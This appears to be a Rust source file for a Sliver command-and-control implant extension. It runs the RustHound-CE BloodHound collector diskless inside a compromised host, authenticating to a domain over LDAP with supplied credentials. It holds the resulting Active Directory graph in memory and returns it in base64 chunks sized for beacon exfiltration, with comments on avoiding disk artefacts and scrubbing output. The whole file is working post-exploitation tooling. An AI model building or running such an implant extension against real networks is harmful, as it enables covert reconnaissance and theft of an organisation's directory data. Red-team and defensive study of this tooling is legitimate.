//! Sliver native-extension entry point for diskless BloodHound collection.
//!
//! Every call produces exactly one UTF-8 JSON callback. Read responses contain
//! at most 32 KiB of raw ZIP data (base64 encoded), fitting the existing Sliver
//! beacon task-content budget. The collector never receives an output path.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use base64::Engine;
use once_cell::sync::Lazy;
use serde::Deserialize;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

use crate::api::run_collection_to_zip;
use crate::args::{CollectionMethod, Options};
use crate::ldap_auth;

const PROTOCOL_VERSION: u8 = 1;
const MAX_REQUEST_BYTES: usize = 64 * 1024;
const MAX_READ_BYTES: usize = 32 * 1024;
const DEFAULT_ZIP_LIMIT: usize = 256 * 1024 * 1024;
const MAX_ZIP_LIMIT: usize = 1024 * 1024 * 1024;
const DEFAULT_TIMEOUT_SECS: u64 = 600;
const MAX_TIMEOUT_SECS: u64 = 3600;

static NEXT_RUN: AtomicU64 = AtomicU64::new(1);
static RUN: Lazy<Mutex<Option<Run>>> = Lazy::new(|| Mutex::new(None));

struct Run {
    id: String,
    cancel: Arc<AtomicBool>,
    phase: Phase,
}

enum Phase {
    Running,
    Complete { zip: Vec<u8>, sha256: String },
    Error(String),
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct Request {
    version: u8,
    op: String,
    run_id: Option<String>,
    domain: Option<String>,
    method: Option<String>,
    username: Option<String>,
    password: Option<String>,
    ldap_fqdn: Option<String>,
    ip: Option<String>,
    port: Option<u16>,
    ldaps: Option<bool>,
    ldap_filter: Option<String>,
    max_bytes: Option<usize>,
    timeout_seconds: Option<u64>,
    offset: Option<u64>,
}

fn error(message: impl AsRef<str>) -> Value {
    json!({"version": PROTOCOL_VERSION, "state": "error", "error": message.as_ref()})
}

fn bounded_text(value: Option<String>, field: &str, max: usize) -> Result<String, String> {
    let value = value.ok_or_else(|| format!("{field} is required"))?;
    if value.is_empty() || value.len() > max || value.contains('\0') {
        return Err(format!("{field} is invalid"));
    }
    Ok(value)
}

fn start(req: Request) -> Result<Value, String> {
    let domain = bounded_text(req.domain, "domain", 253)?;
    if !domain.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-') {
        return Err("domain is invalid".into());
    }
    let username = bounded_text(req.username, "username", 256)?;
    if username.contains('\\') {
        return Err("username must be a UPN or bare account name".into());
    }
    // Requiring a password prevents RustHound's CLI-oriented auth path from
    // prompting inside an implant. Current-token SSPI is not supported here.
    let password = bounded_text(req.password, "password", 1024)?;
    let method = match req.method.as_deref().unwrap_or("LdapOnly") {
        "LdapOnly" => CollectionMethod::LdapOnly,
        "DCOnly" => CollectionMethod::DCOnly,
        "All" => CollectionMethod::All,
        _ => return Err("method must be LdapOnly, DCOnly, or All".into()),
    };
    let max_bytes = req.max_bytes.unwrap_or(DEFAULT_ZIP_LIMIT);
    if !(1..=MAX_ZIP_LIMIT).contains(&max_bytes) {
        return Err("maxBytes is outside the supported range".into());
    }
    let timeout_seconds = req.timeout_seconds.unwrap_or(DEFAULT_TIMEOUT_SECS);
    if !(1..=MAX_TIMEOUT_SECS).contains(&timeout_seconds) {
        return Err("timeoutSeconds is outside the supported range".into());
    }
    let ldap_filter = req.ldap_filter.unwrap_or_else(|| "(objectClass=*)".to_owned());
    if ldap_filter.is_empty() || ldap_filter.len() > 1024 || ldap_filter.contains('\0') {
        return Err("ldapFilter is invalid".into());
    }
    if let Some(ref fqdn) = req.ldap_fqdn {
        if fqdn.is_empty() || fqdn.len() > 253 || fqdn.contains('\0') {
            return Err("ldapFqdn is invalid".into());
        }
    }
    if let Some(ref ip) = req.ip {
        ip.parse::<std::net::IpAddr>().map_err(|_| "ip is invalid")?;
    }
    let options = Options {
        domain,
        username: Some(username),
        password: Some(password),
        ldapfqdn: req.ldap_fqdn,
        ip: req.ip,
        port: req.port,
        name_server: "127.0.0.1".to_owned(),
        path: String::new(),
        collection_method: method,
        ldaps: req.ldaps.unwrap_or(false),
        dns_tcp: false,
        fqdn_resolver: false,
        hashes: None,
        kerberos: false,
        pfx: None,
        pfx_pass: None,
        crt: None,
        key: None,
        zip: true,
        verbose: log::LevelFilter::Off,
        ldap_filter,
        cache: false,
        cache_buffer_size: 0,
        resume: false,
    };

    let id = format!("{:016x}", NEXT_RUN.fetch_add(1, Ordering::Relaxed));
    let cancel = Arc::new(AtomicBool::new(false));
    {
        let mut slot = RUN.lock().map_err(|_| "collector state is unavailable")?;
        if slot.is_some() {
            return Err("a collection is already registered; finish or abort it first".into());
        }
        *slot = Some(Run { id: id.clone(), cancel: cancel.clone(), phase: Phase::Running });
    }

    let worker_id = id.clone();
    let worker_cancel = cancel.clone();
    let spawn = std::thread::Builder::new()
        .name("rusthound-ce-collector".into())
        .spawn(move || {
            let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                collect(options, max_bytes, timeout_seconds, worker_cancel.clone())
            }))
            .unwrap_or_else(|_| Err("collector worker panicked".into()));
            if let Ok(mut slot) = RUN.lock() {
                if let Some(run) = slot.as_mut() {
                    if run.id == worker_id {
                        if worker_cancel.load(Ordering::Relaxed) {
                            // Abort does not free the slot until the worker has
                            // stopped, preventing overlapping collectors.
                            *slot = None;
                            if let Ok(mut zip) = result { zip.fill(0); }
                            return;
                        }
                        run.phase = match result {
                            Ok(zip) => {
                                let sha256 = format!("{:x}", Sha256::digest(&zip));
                                Phase::Complete { zip, sha256 }
                            }
                            Err(message) => Phase::Error(message),
                        };
                        return;
                    }
                }
            }
            // The operator aborted the run. Scrub output before releasing it.
            if let Ok(mut zip) = result {
                zip.fill(0);
            }
        });
    if let Err(e) = spawn {
        if let Ok(mut slot) = RUN.lock() {
            *slot = None;
        }
        return Err(format!("collector thread failed: {e}"));
    }
    Ok(json!({"version": PROTOCOL_VERSION, "state": "running", "runId": id}))
}

fn collect(
    mut options: Options,
    max_bytes: usize,
    timeout_seconds: u64,
    cancel: Arc<AtomicBool>,
) -> Result<Vec<u8>, String> {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
        .map_err(|e| format!("collector runtime failed: {e}"))?;
    let result = runtime.block_on(async {
        tokio::select! {
            result = async {
                let mut ldap = ldap_auth(&options).await.map_err(|e| e.to_string())?;
                let result = run_collection_to_zip(&mut ldap, &options, max_bytes)
                    .await.map_err(|e| e.to_string());
                let _ = ldap.unbind().await;
                result
            } => result,
            _ = tokio::time::sleep(Duration::from_secs(timeout_seconds)) => Err("collection timed out".into()),
            _ = async {
                while !cancel.load(Ordering::Relaxed) {
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            } => Err("collection aborted".into()),
        }
    });
    // This does not remove copies inside third-party auth libraries, but keeps
    // the extension's own credential copy out of long-lived run state.
    if let Some(mut password) = options.password.take() {
        unsafe { password.as_bytes_mut().fill(0) };
    }
    result
}

fn find_run<'a>(slot: &'a mut Option<Run>, req: &Request) -> Result<&'a mut Run, String> {
    let id = req.run_id.as_deref().ok_or("runId is required")?;
    match slot.as_mut() {
        Some(run) if run.id == id => Ok(run),
        _ => Err("runId was not found".into()),
    }
}

fn status(req: &Request) -> Result<Value, String> {
    let mut slot = RUN.lock().map_err(|_| "collector state is unavailable")?;
    let run = find_run(&mut slot, req)?;
    Ok(match &run.phase {
        Phase::Running => json!({"version": PROTOCOL_VERSION, "state": "running", "runId": run.id}),
        Phase::Complete { zip, sha256 } => json!({"version": PROTOCOL_VERSION, "state": "complete", "runId": run.id, "size": zip.len(), "sha256": sha256}),
        Phase::Error(message) => json!({"version": PROTOCOL_VERSION, "state": "error", "runId": run.id, "error": message}),
    })
}

fn read(req: &Request) -> Result<Value, String> {
    let offset = req.offset.ok_or("offset is required")?;
    let max_bytes = req.max_bytes.unwrap_or(MAX_READ_BYTES);
    if !(1..=MAX_READ_BYTES).contains(&max_bytes) {
        return Err("maxBytes must be between 1 and 32768 for read".into());
    }
    let mut slot = RUN.lock().map_err(|_| "collector state is unavailable")?;
    let run = find_run(&mut slot, req)?;
    match &run.phase {
        Phase::Complete { zip, .. } => {
            let offset = usize::try_from(offset).map_err(|_| "offset exceeds ZIP size")?;
            if offset > zip.len() {
                return Err("offset exceeds ZIP size".into());
            }
            let next = offset.saturating_add(max_bytes).min(zip.len());
            let data = base64::engine::general_purpose::STANDARD.encode(&zip[offset..next]);
            Ok(json!({"version": PROTOCOL_VERSION, "state": "chunk", "runId": run.id, "offset": offset, "nextOffset": next, "data": data}))
        }
        Phase::Running => Err("collection is still running".into()),
        Phase::Error(message) => Err(message.clone()),
    }
}

fn finish(req: &Request, abort: bool) -> Result<Value, String> {
    let mut slot = RUN.lock().map_err(|_| "collector state is unavailable")?;
    let run = find_run(&mut slot, req)?;
    if !abort && matches!(run.phase, Phase::Running) {
        return Err("collection is still running".into());
    }
    let id = run.id.clone();
    if abort {
        run.cancel.store(true, Ordering::Relaxed);
    }
    if !matches!(run.phase, Phase::Running) {
        if let Some(mut run) = slot.take() {
            if let Phase::Complete { zip, .. } = &mut run.phase {
                zip.fill(0);
            }
        }
    }
    Ok(json!({"version": PROTOCOL_VERSION, "state": if abort { "aborted" } else { "finished" }, "runId": id}))
}

fn dispatch(bytes: &[u8]) -> Value {
    let req: Request = match serde_json::from_slice(bytes) {
        Ok(req) => req,
        Err(_) => return error("invalid JSON request"),
    };
    if req.version != PROTOCOL_VERSION {
        return error("unsupported protocol version");
    }
    let result = match req.op.as_str() {
        "start" => start(req),
        "status" => status(&req),
        "read" => read(&req),
        "finish" => finish(&req, false),
        "abort" => finish(&req, true),
        _ => Err("unsupported operation".into()),
    };
    result.unwrap_or_else(error)
}

fn catch_request(f: impl FnOnce() -> Value) -> Value {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(f))
        .unwrap_or_else(|_| error("collector request panicked"))
}

type Callback = unsafe extern "system" fn(*const u8, i32) -> i32;

/// Sliver extension ABI: `int RustHoundCE(char *request, uint32_t length,
/// int (*callback)(char *, int))`. The callback is invoked once per call.
#[no_mangle]
pub unsafe extern "system" fn RustHoundCE(
    request: *const u8,
    length: u32,
    callback: Option<Callback>,
) -> i32 {
    let response = catch_request(|| {
        if request.is_null() || length as usize > MAX_REQUEST_BYTES {
            error("request pointer or length is invalid")
        } else {
            dispatch(std::slice::from_raw_parts(request, length as usize))
        }
    });
    let bytes = serde_json::to_vec(&response).unwrap_or_else(|_| b"{\"version\":1,\"state\":\"error\",\"error\":\"response serialization failed\"}".to_vec());
    match callback {
        Some(callback) if bytes.len() <= i32::MAX as usize => callback(bytes.as_ptr(), bytes.len() as i32),
        _ => 1,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_interactive_or_unsupported_requests() {
        assert_eq!(dispatch(br#"{"version":1,"op":"start","domain":"example.local","username":"user","method":"LdapOnly"}"#)["state"], "error");
        assert_eq!(dispatch(br#"{"version":2,"op":"status","runId":"1"}"#)["error"], "unsupported protocol version");
        assert_eq!(dispatch(br#"{"version":1,"op":"read","runId":"1","offset":0,"maxBytes":32769}"#)["state"], "error");
    }

    #[test]
    fn panic_never_escapes_the_request_boundary() {
        let output = catch_request(|| panic!("test panic"));
        assert_eq!(output["state"], "error");
        assert_eq!(output["error"], "collector request panicked");
    }
}
